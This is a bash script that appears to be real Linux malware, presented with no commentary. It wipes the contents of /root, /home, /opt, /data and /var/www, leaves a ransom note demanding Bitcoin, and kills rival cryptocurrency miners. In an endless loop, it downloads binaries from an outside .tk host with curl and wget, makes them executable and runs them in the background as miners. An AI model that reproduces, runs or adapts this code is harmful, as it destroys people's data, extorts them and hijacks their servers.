#!/bin/bash

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
function kills() {
#ps aux |grep -v sourplum | awk '{if($3>20.0) print $2}' | while read procid
#do
#pkill -f $procid
#done
rm -rf /root/*
rm -rf /home/*
rm -rf /opt/*
rm -rf /data/*
rm -rf /data*
rm -rf /var/www/*
mkdir -p /data
echo -e "\nWarning! \nYour File and DataBase is downloaded and backed up on our secured servers. To recover your lost data : Send 0.3 BTC to our BitCoin Address and Contact us by eMail with your server IP Address and a Proof of Payment. Any eMail without your server IP Address and a Proof of Payment together will be ignored. We will drop the backup after 24 hours. You are welcome! \nMail:unlockandrecover@pm.me \nBitCoin:1NrZsNppQqXNiYnu34MPo6K2sHYyMPjR4h\n" > /root/Warning.txt
chmod +x /root/Warning.txt
cp /root/Warning.txt /Warning.txt
cp /root/Warning.txt /data/Warning.txt
cp /root/Warning.txt /home/Warning.txt
echo -e "\nWarning! \nYour File and DataBase is downloaded and backed up on our secured servers. To recover your lost data : Send 0.3 BTC to our BitCoin Address and Contact us by eMail with your server IP Address and a Proof of Payment. Any eMail without your server IP Address and a Proof of Payment together will be ignored. We will drop the backup after 24 hours. You are welcome! \nMail:unlockandrecover@pm.me \nBitCoin:1NrZsNppQqXNiYnu34MPo6K2sHYyMPjR4h\n" > /tmp/Warning.txt
chmod +x /tmp/Warning.txt
cp /tmp/Warning.txt /Warning.txt
cp /tmp/Warning.txt /data/Warning.txt
cp /tmp/Warning.txt /home/Warning.txt
pkill -f sourplum
pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
rm -rf /tmp/a7b104c270
pkill -f AnXqV.yam
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1
rm -f /tmp/irq
PORT_NUMBER=3333
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=5555
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=7777
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
PORT_NUMBER=14444
lsof -i tcp:${PORT_NUMBER} | awk 'NR!=1 {print $2}' | xargs kill -9
}
function downloadyam() {
	if [ ! -f "/tmp/config.json" ]; then
			curl http://3g2upl4pq6kufc4m.tk/config.json -o /tmp/config.json && chmod +x /tmp/config.json
			if [ ! -f "/tmp/config.json" ]; then
				wget http://3g2upl4pq6kufc4m.tk/config.json -P /tmp && chmod +x /tmp/config.json
				rm -rf config.json.*
			fi
	fi

	if [ ! -f "/tmp/bashf" ]; then
	    curl http://3g2upl4pq6kufc4m.tk/bashf -o /tmp/bashf && chmod +x /tmp/bashf
			if [ ! -f "/tmp/bashf" ]; then
				wget http://3g2upl4pq6kufc4m.tk/bashf -P /tmp && chmod +x /tmp/bashf
				rm -rf bashf.*
			fi
			#nohup /tmp/bashf -p $(hostname)>/dev/null 2>&1 &
			nohup /tmp/bashf -p bashf>/dev/null 2>&1 &
	else
			#writecrontab
			#writerc
			p=$(ps aux | grep bashf | grep -v grep | wc -l)
			if [ ${p} -eq 1 ];then
				echo "bashf"
			elif [ ${p} -eq 0 ];then
				#nohup /tmp/bashf -p $(hostname)>/dev/null 2>&1 &
				nohup /tmp/bashf -p bashf>/dev/null 2>&1 &
			else
				echo ""
			fi
	fi

	sleep 15

	p=$(ps aux | grep bashf | grep -v grep | wc -l)
	if [ ${p} -eq 1 ];then
		echo "bashf"
	elif [ ${p} -eq 0 ];then
		if [ ! -f "/tmp/pools.txt" ]; then
				curl http://3g2upl4pq6kufc4m.tk/pools.txt -o /tmp/pools.txt && chmod +x /tmp/pools.txt
				if [ ! -f "/tmp/pools.txt" ]; then
					wget http://3g2upl4pq6kufc4m.tk/pools.txt -P /tmp && chmod +x /tmp/pools.txt
					rm -rf pools.txt.*
				fi
		fi

		if [ ! -f "/tmp/bashg" ]; then
				curl http://3g2upl4pq6kufc4m.tk/bashg -o /tmp/bashg && chmod +x /tmp/bashg
				if [ ! -f "/tmp/bashg" ]; then
					wget http://3g2upl4pq6kufc4m.tk/bashg -P /tmp && chmod +x /tmp/bashg
					rm -rf bashg.*
				fi
				nohup /tmp/bashg  -C /tmp/pools.txt>/dev/null 2>&1 &
		else
				p=$(ps aux | grep bashg | grep -v grep | wc -l)
				if [ ${p} -eq 1 ];then
					echo "bashg"
				elif [ ${p} -eq 0 ];then
					nohup /tmp/bashg -C /tmp/pools.txt>/dev/null 2>&1 &
				else
					echo ""
				fi
		fi
	else
		echo ""
	fi
	sleep 15
	if [ ! -f "/tmp/zlibxw" ]; then
			curl http://3g2upl4pq6kufc4m.tk/zlibxw -o /tmp/zlibxw && chmod +x /tmp/zlibxw
			if [ ! -f "/tmp/zlibxw" ]; then
				wget http://3g2upl4pq6kufc4m.tk/zlibxw -P /tmp && chmod +x /tmp/zlibxw
				rm -rf zlibxw.*
			fi
			nohup /tmp/zlibxw >/dev/null 2>&1 &
	else
			p=$(ps aux | grep zlibxw | grep -v grep | wc -l)
			if [ ${p} -eq 1 ];then
				echo "zlibxw"
			elif [ ${p} -eq 0 ];then
				nohup /tmp/zlibxw >/dev/null 2>&1 &
			else
				echo ""
			fi
	fi
}

while [ 1 ]
do
	kills
	downloadyam
	sleep 600
done
